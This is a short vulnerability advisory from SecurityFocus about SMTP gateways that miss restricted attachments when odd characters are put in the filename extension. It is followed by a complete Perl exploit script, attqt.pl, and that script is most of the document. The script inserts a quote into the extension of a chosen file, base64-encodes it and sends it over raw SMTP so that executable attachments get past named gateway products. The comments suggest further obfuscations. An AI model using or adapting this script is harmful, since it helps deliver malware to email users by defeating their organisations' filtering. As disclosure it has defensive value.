source: http://www.securityfocus.com/bid/3097/info

At least two SMTP gateway products have been identified which contain flaws in the handling of restricted filetypes as attachments.

An attacker can insert extraneous characters in the filename extension of a hostile attachment.

The affected gateway will fail to detect the modified extension. Since Microsoft Outlook removes illegal characters in extensions, the executable attachment is delivered to the recipient user with its normal, working extension intact.

#!/usr/bin/perl

# attqt.pl 0.1 by Aidan O'Kelly July 2001
# Send banned attachments through SMTP gateways, this works because MS
Outlook removes illegal
# characters in filenames. So when you put an illegal char (such as ") in
the extension. The Gateway will
# not recognize it as a dangerous attachment. However, when the user on
the other end opens it the illegal
# char will be removed.
#
# Feedback welcome. aidan.ok@oceanfree.net
#
# This is known to work on MailMarshall and TrendMicro Scanmail. Others
have not been tested but most are
# probably vulnerable. If it works on any others, please mail me and let
me know.
# This only puts in one quote after the dot (eg virus."vbs or virus."exe)
# Some gateways might still pick up on the vbs. you can put in more or
different
# charachters like virus.%v"b********s if you feel like it.
# $filename =~ s/\./\.\"/g; is the line that changes it.


use Getopt::Std;
use MIME::Base64 qw(encode_base64);
use IO::Socket::INET;


getopt('atfhsb');

if (!$opt_a || !$opt_f || !$opt_t || !$opt_h)
{
  print "Usage: attqt.pl <-a attachment> <-t to> <-f from> <-h smtphost>
[-s subject] [-b text]\n";
  exit;
}

open(FILE, $opt_a) or die "$!";
binmode FILE;
   while (read(FILE, $buf, 60*57)) {
       $attachment = $attachment . encode_base64($buf);
   }
close(FILE);
$filename = $opt_a;
$filename =~ s/\./\.\"/g;
print "$filename\n";
$sock = IO::Socket::INET->new(PeerAddr => "$opt_h",PeerPort => '25', Proto
=> 'tcp');
unless (<$sock> =~ "220") { die "Not a SMTP Server?" }
print $sock "HELO you\r\n";
unless (<$sock> =~ "250") { die "HELO failed" }
print $sock "MAIL FROM:<>\r\n";
unless (<$sock> =~ "250") { die "MAIL FROM failed" }
print $sock "RCPT TO:<$opt_t>\r\n";
unless (<$sock> =~ "250") { die "RCPT TO failed" }
print $sock "DATA\r\n";
unless (<$sock> =~ "354") { die "DATA failed" }


print $sock "From: $opt_f\n";
print $sock "To: $opt_t\n";
print $sock "Subject: $opt_s\n";

print $sock "MIME-Version: 1.0
Content-Type: multipart/related;
        type=\"multipart/alternative\";
        boundary=\"NextPart19\"

This is a multi-part message in MIME format.

--NextPart19
Content-Type: multipart/alternative;

        boundary=\"NextPart20\"

--NextPart20
Content-Type: text/plain
Content-Transfer-Encoding: quoted-printable

--NextPart20
Content-Type: text/html;
        charset=\"iso-8859-1\"
Content-Transfer-Encoding: quoted-printable

";
print $sock "$opt_b\n";
print $sock "--NextPart20--

--NextPart19
Content-Type: application/x-msdownload
Content-Disposition: attachment;filename=\"$filename\"
Content-Transfer-Encoding: base64\r\n\n";
print $sock $attachment;

print $sock "\r\n--NextPart19--\n.\n";
print "Finished sending data\n";
$a = <$sock>;
print "$a\n";
close($sock);